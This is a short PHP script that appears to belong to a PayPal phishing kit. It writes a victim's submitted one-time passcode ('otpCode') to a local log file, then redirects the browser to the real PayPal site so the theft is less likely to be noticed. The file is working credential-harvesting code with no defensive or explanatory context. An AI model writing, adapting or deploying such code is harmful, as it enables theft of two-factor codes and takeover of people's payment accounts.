<?php

    file_put_contents("log.txt", "OTP: " . $_POST['otpCode'] . "\nok", FILE_APPEND);
header('Location: https://www.paypal.com');
exit();
